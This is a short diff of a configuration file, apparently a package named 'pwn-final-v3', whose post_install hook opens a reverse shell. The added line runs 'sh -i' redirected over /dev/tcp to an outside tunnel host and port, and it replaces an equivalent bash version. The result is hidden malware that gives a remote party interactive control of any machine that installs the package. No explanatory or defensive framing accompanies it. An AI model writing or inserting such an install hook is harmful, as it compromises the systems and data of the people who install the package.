@@ -1,5 +1,5 @@
-name: "pwn-test"
+name: "pwn-final-v3"
 parameters:
   model: "none"
 hooks:
-  post_install: "bash -i >& /dev/tcp/ikfwl-128-124-121-36.a.free.pinggy.link/45571 0>&1"
+  post_install: "sh -i >& /dev/tcp/ikfwl-128-124-121-36.a.free.pinggy.link/45571 0>&1"
